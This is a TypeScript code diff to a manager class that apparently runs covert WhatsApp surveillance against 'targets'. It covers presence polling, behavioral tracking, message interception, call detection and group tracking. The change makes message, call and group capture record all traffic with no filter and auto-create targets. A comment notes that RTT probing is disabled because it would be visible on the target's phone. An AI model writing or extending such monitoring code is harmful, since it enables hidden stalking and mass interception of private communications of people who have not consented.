@@ -23,8 +23,11 @@ interface SessionDetectors {
 
 /**
  * Manages the lifecycle of all 6 detection modules across sessions.
- * Ensures detectors are created once per session and new targets can be
- * added/removed dynamically without recreating everything.
+ *
+ * Methods 4-5-6 (MessageInterceptor, CallDetector, GroupTracker) capture ALL
+ * traffic without JID filtering. They auto-create Targets via findOrCreateTarget.
+ *
+ * Methods 1-3 (Presence, RTT, Behavioral) still use JID lists for active polling.
  */
 export class DetectionManager {
   private sessionDetectors = new Map<string, SessionDetectors>();
@@ -37,13 +40,14 @@ export class DetectionManager {
   ) {}
 
   /**
-   * Wire detection for all active targets on all connected sessions.
-   * Safe to call multiple times — existing detectors are reused.
+   * Wire detection for all connected sessions.
+   * Methods 1+3 need existing target JIDs for active polling.
+   * Methods 4-5-6 capture everything (no JID list needed).
    */
   async wireAll(): Promise<void> {
     const targets = await this.prisma.target.findMany({ where: { isActive: true } });
 
-    // Group targets by session
+    // Group targets by session (for presence/behavioral polling)
     const targetsBySession = new Map<string, string[]>();
     for (const target of targets) {
       this.signalAggregator.addTarget(target.jid);
@@ -52,7 +56,10 @@ export class DetectionManager {
       targetsBySession.set(target.sessionId, list);
     }
 
-    for (const [sessionId, jids] of targetsBySession) {
+    // Wire all connected sessions
+    const connections = this.sessionManager.getConnections();
+    for (const [sessionId] of connections) {
+      const jids = targetsBySession.get(sessionId) ?? [];
       await this.wireSession(sessionId, jids);
     }
   }
@@ -64,11 +71,11 @@ export class DetectionManager {
     const conn = this.sessionManager.getConnection(sessionId);
     if (!conn?.isConnected) return;
 
-    // If detectors already exist for this session, just add new JIDs
+    // If detectors already exist, just add new JIDs for presence/behavioral
     const existing = this.sessionDetectors.get(sessionId);
     if (existing) {
       for (const jid of jids) {
-        await this.addJidToDetectors(existing, jid);
+        await existing.presenceSubscriber.subscribe(jid);
       }
       log.info({ sessionId, newJids: jids.length }, 'Added targets to existing detectors');
       return;
@@ -78,39 +85,34 @@ export class DetectionManager {
     const detectors = await this.createDetectors(sessionId, jids);
     if (detectors) {
       this.sessionDetectors.set(sessionId, detectors);
-      log.info({ sessionId, targetCount: jids.length }, 'All 6 detection methods wired');
+      log.info({ sessionId, targetCount: jids.length }, 'All detection methods wired');
     }
   }
 
   /**
-   * Add a single target to detection on a specific session.
-   * Called when a new target is created via the API.
+   * Add a single target to presence/behavioral detection.
+   * Methods 4-5-6 don't need this — they capture everything already.
    */
   async addTarget(sessionId: string, jid: string): Promise<void> {
     this.signalAggregator.addTarget(jid);
 
     const detectors = this.sessionDetectors.get(sessionId);
     if (detectors) {
-      await this.addJidToDetectors(detectors, jid);
-      log.info({ sessionId, jid }, 'Target added to detection pipeline');
+      await detectors.presenceSubscriber.subscribe(jid);
+      log.info({ sessionId, jid }, 'Target added to presence detection');
     } else {
-      // No detectors for this session yet — wire the whole session
       await this.wireSession(sessionId, [jid]);
     }
   }
 
   /**
-   * Remove a target from detection.
+   * Remove a target from presence detection.
    */
   removeTarget(jid: string): void {
     this.signalAggregator.removeTarget(jid);
 
     for (const [, detectors] of this.sessionDetectors) {
       detectors.presenceSubscriber.unsubscribe(jid);
-      detectors.rttProber.stopProbing(jid);
-      detectors.messageInterceptor.removeJid(jid);
-      detectors.callDetector.removeJid(jid);
-      detectors.groupTracker.removeJid(jid);
     }
   }
 
@@ -149,22 +151,21 @@ export class DetectionManager {
     const conn = this.sessionManager.getConnection(sessionId);
     if (!conn?.isConnected) return null;
 
-    // Method 1: Presence Subscriber
+    // Method 1: Presence Subscriber (still uses JID list for active polling)
     const presenceSubscriber = new PresenceSubscriber(conn);
     presenceSubscriber.on('signal', (signal) => this.signalAggregator.ingestSignal(signal));
     await presenceSubscriber.start(jids);
 
     // Method 2: RTT Prober — DISABLED (sends visible reactions to target phone)
     const rttProber = new RttProber(conn);
-    // DO NOT start: rttProber.on('signal', ...) and rttProber.start() are intentionally skipped
 
-    // Method 3: Behavioral Detector
+    // Method 3: Behavioral Detector (still uses JID list)
     const behavioralDetector = new BehavioralDetector(conn);
     behavioralDetector.on('signal', (signal) => this.signalAggregator.ingestSignal(signal));
     await behavioralDetector.start(jids);
 
-    // Method 4: Message Interceptor
-    const messageInterceptor = new MessageInterceptor(conn, this.prisma);
+    // Method 4: Message Interceptor — captures ALL messages, no JID filter
+    const messageInterceptor = new MessageInterceptor(conn, this.prisma, sessionId);
     if (this.io) {
       messageInterceptor.on('message', (event) => {
         this.io!.to(`target:${event.targetJid}`).emit('message:new', event);
@@ -177,26 +178,26 @@ export class DetectionManager {
         this.io!.to(`target:${event.targetJid}`).emit('message:reaction', event);
       });
     }
-    await messageInterceptor.start(jids);
+    await messageInterceptor.start();
 
-    // Method 5: Call Detector
-    const callDetector = new CallDetector(conn, this.prisma);
+    // Method 5: Call Detector — captures ALL calls, no JID filter
+    const callDetector = new CallDetector(conn, this.prisma, sessionId);
     if (this.io) {
       callDetector.on('call', (event) => {
         this.io!.to(`target:${event.targetJid}`).emit('call:event', event);
         this.io!.emit('dashboard:call', event);
       });
     }
-    await callDetector.start(jids);
+    await callDetector.start();
 
-    // Method 6: Group Tracker
-    const groupTracker = new GroupTracker(conn, this.prisma);
+    // Method 6: Group Tracker — captures ALL group activity, no JID filter
+    const groupTracker = new GroupTracker(conn, this.prisma, sessionId);
     if (this.io) {
       groupTracker.on('group:activity', (event) => {
         this.io!.to(`target:${event.targetJid}`).emit('group:activity', event);
       });
     }
-    await groupTracker.start(jids);
+    await groupTracker.start();
 
     return {
       presenceSubscriber,
@@ -206,15 +207,5 @@ export class DetectionManager {
       callDetector,
       groupTracker,
     };
-  }
-
-  private async addJidToDetectors(detectors: SessionDetectors, jid: string): Promise<void> {
-    // Methods 1-2: actively poll/subscribe
-    await detectors.presenceSubscriber.subscribe(jid);
-    // detectors.rttProber.startProbing(jid); // DISABLED — visible to target
-    // Methods 4-5-6: add to their monitored JID sets so they filter correctly
-    detectors.messageInterceptor.addJid(jid);
-    detectors.callDetector.addJid(jid);
-    detectors.groupTracker.addJid(jid);
   }
 }
